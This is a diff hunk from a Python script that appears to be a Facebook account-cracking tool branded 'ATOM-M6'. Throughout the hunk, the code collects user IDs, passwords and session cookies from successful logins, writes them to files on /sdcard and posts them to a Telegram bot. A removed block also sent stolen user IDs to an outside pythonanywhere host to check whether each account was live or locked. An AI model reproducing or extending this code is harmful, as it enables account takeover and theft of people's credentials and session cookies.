@@ -1264,31 +1264,12 @@ def m6(idf,pw):
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
             break
-   if 'c_user' in lo.cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
-    reqx = requests.get(url).text
-    if 'live' in reqx:
-            print(f'\r\r{P}[ATOM-OK-1]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            statusok = (f" {user} | {ps} | {coki} ")
-            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK-2]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-   elif 'checkpoint' in log_cookies:
+   elif 'c_user' in lo.cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
-    if 'y' in cp_xdx:
      print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
+     print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
     cp.append(uid)
    else:
